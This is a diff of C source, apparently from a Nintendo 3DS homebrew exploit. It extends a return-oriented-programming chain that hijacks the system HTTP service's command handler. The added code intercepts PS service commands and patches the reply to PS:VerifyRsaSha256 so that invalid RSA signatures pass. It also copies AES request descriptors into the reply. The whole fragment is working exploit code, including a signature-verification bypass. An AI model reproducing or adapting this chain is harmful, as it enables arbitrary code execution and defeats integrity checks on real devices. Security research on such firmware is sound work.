@@ -92,7 +92,7 @@ u32 ROP_HTTPC_CMDHANDLEROBJ_VTABLE = 0x0011b854;//This is the vtable for the htt
 u32 ROP_HTTPC_CMDHANDLEROBJ_VTABLE_SIZE = 0x148;
 
 static u32 ropvmem_base = 0x0f000000;
-u32 ropvmem_size = 0x10000;
+u32 ropvmem_size = 0x11000;
 
 u32 httpheap_size = 0x22000;
 
@@ -873,7 +873,7 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	u32 *ropchain_block0, ropvaddr_block0;
 	u32 *ropchain_block1, ropvaddr_block1;
 
-	u32 ropallocsize = 0x4000;
+	u32 ropallocsize = 0x5000;
 	u32 ropoffset = 0x800;
 	u32 bakropoff = ropoffset + ropallocsize;
 	u32 roplaunch_bakaddr;
@@ -901,6 +901,7 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	u32 curent = ropheap+0x3c;
 	u32 ropentry_type = ropheap+0x44;
 	u32 customcmdhandler_handlestorage = ropheap+0x70;
+	u32 cmdreq_storage = ropheap+0x74;
 
 	u32 customcmdhandler_roplaunch_savedregs_addr=0;
 
@@ -1284,6 +1285,10 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 
 	ropgen_writeu32(&ropchain, &ropvaddr, 0x0, ropentry_type, 1);//Write 0x0 to ropentry_type.
 
+	ropgen_copyu32(&ropchain, &ropvaddr, ropheap+0x0, ropvaddr + 0x40 + 0x50, 0x3);//Overwrite the src-addr used with the below memcpy with the cmdbuf ptr.
+
+	ropgen_memcpy(&ropchain, &ropvaddr, cmdreq_storage, 0, 0x40);
+
 	//Setup the default cmdreply data, for invalid cmdid.
 	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//cmdreply[0] = 0x00000040;
 	ropgen_add_r0ip(&ropchain, &ropvaddr, 0xfffffffc);
@@ -1338,6 +1343,56 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	ropgen_movr1r0(&ropchain, &ropvaddr);
 	ropgen_setr0(&ropchain, &ropvaddr, 0);
 	ropgen_strr0r1(&ropchain, &ropvaddr, 0, 0);
+
+	/*
+	if(cmdhdr==0x00040204)//PS:EncryptDecryptAes
+	{
+		memcpy(&cmdreply[6], &saved_cmdreq[9], 0x10);//Copy the translate descriptors + bufaddrs to the cmdreply.
+	}
+	*/
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x14, 1);
+	ropgen_popr1(&ropchain, &ropvaddr, 0x000401C4);
+	ropchain3 = ropchain;
+	ropvaddr3 = ropvaddr;
+	ropgen_checkcond_eqcontinue_nejump(&ropchain, &ropvaddr, 0);
+
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//Write the address of cmdbuf[6] to the below dst-ptr used with memcpy.
+	ropgen_add_r0ip(&ropchain, &ropvaddr, 6<<2);
+	ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x40, 1);
+
+	ropgen_memcpy(&ropchain, &ropvaddr, 0, cmdreq_storage+(9<<2), 0x10);
+
+	ropgen_checkcond_eqcontinue_nejump(&ropchain3, &ropvaddr3, ropvaddr);
+
+	/*
+	if(cmdhdr==0x00020244)//PS:VerifyRsaSha256
+	{
+		memcpy(&cmdreply[2], &saved_cmdreq[12], 0x8);//Copy the translate descriptors + bufaddrs to the cmdreply.
+		cmdreply[1] = 0x1;//Overwrite the resultcode to bypass invalid signature errors. 0x1 is for testing.
+	}
+	*/
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x14, 1);
+	ropgen_popr1(&ropchain, &ropvaddr, 0x00020244);
+	ropchain3 = ropchain;
+	ropvaddr3 = ropvaddr;
+	ropgen_checkcond_eqcontinue_nejump(&ropchain, &ropvaddr, 0);
+
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//Write the address of cmdbuf[2] to the below dst-ptr used with memcpy.
+	ropgen_add_r0ip(&ropchain, &ropvaddr, 2<<2);
+	ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x40, 1);
+
+	ropgen_memcpy(&ropchain, &ropvaddr, 0, cmdreq_storage+(12<<2), 0x8);
+
+	//cmdreply[1] = 0x1
+	ropgen_setr0(&ropchain, &ropvaddr, 0);
+	ropgen_strr0r1(&ropchain, &ropvaddr, ropvaddr + 0x20 + 0x20 + 0x2c + 0x4, 1);
+
+	ropgen_ldrr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);
+	ropgen_movr1r0(&ropchain, &ropvaddr);
+	ropgen_setr0(&ropchain, &ropvaddr, 0);
+	ropgen_strr0r1(&ropchain, &ropvaddr, 0, 0);
+
+	ropgen_checkcond_eqcontinue_nejump(&ropchain3, &ropvaddr3, ropvaddr);
 
 	//Setup the ROP used for returning to the actual cmdhandler thread code.
 	ropgen_writeu32(&ropchain, &ropvaddr, ROP_POP_R4R5R6R7R8R9SLFPIPPC, __httpmainthread_handlerfunc_stackframe-0x28-4, 1);//When doing the stack-pivot, it will jump to ROP_POP_R4R5R6R7R8R9SLFPIPPC for pc with this.
